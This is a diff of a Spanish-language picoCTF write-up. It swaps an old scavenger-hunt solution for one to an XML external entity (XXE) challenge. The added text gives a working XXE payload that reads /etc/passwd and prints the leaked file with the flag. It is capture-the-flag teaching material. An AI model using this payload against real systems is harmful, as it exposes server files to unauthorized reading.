@@ -3,7 +3,7 @@
 
 *The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
 
-Additional details will be available after launching your challenge instance. http://saturn.picoctf.net:56020/*
+http://saturn.picoctf.net:50929/
 
 ## Pistas
 
@@ -12,40 +12,22 @@ Additional details will be available after launching your challenge instance. ht
 ## Solución
 
 ```
-
-Indice HTML
-<!-- Here's the first part of the
-flag: picoCTF{t
-
-CSS
-/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
-
-JS.
-/* How can I keep Google from indexing my website? */
-http://mercury.picoctf.net:5080/robots.txt
-User-agent: *
-Disallow: /index.html
-# Part 3: t_0f_pl4c
-# I think this is an apache server... can you Access the next flag?
-
-#Seguimos pista
-http://mercury.picoctf.net:5080/.htaccess
-# Part 4: 3s_2_lO0k
-# I love making websites on my Mac, I can Store a lot of information there.
-
-#Seguimos pista
-
-http://mercury.picoctf.net:5080/.DS_Store
-Congrats! You completed the scavenger hunt.
-Part 5: _35844447}
-picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_35844447}
+En kali entramos a la instancia, en inspeccionar
+le damos en details, luego en resend
+despues modificamos el body
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>&example;</ID></data>
+Le damos resend 
+nos muestra otra pagina que es http://saturn.picoctf.net:50637/data
+donde se encuentra la bandera
+Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
 ```
-
-picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_35844447}
-
+picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
 ## Notas Adicionales 
 
-Al darle click en What en el sitio, nos mandaba varias cosas que usaba, entonces le dimos inspeccionar, luego fuentes, en el html encontramos la primera parte, en css la segunda, en l tercera en javascripts nos da una pista si no quiero que google indexe mi sitio web entonces voy a robots.txt,donde se va encontrar la siguiente parte, luego la pista de ahi dice que esta en un servidor apache que es htaccess dond estará la otra bandera, finalmente dice la pista que es donde se almacena un monton de informacion que es el ds_store , juntamos las 5 partes y obtenemos la bandera.
+
 ## Referencias 
 
-http://saturn.picoctf.net:56020/
+http://saturn.picoctf.net:50929/
+https://portswigger.net/web-security/xxe
+http://saturn.picoctf.net:50929/data
+https://www.youtube.com/watch?v=S3awG6dCxS0&ab_channel=CTFDiaryIndonesia
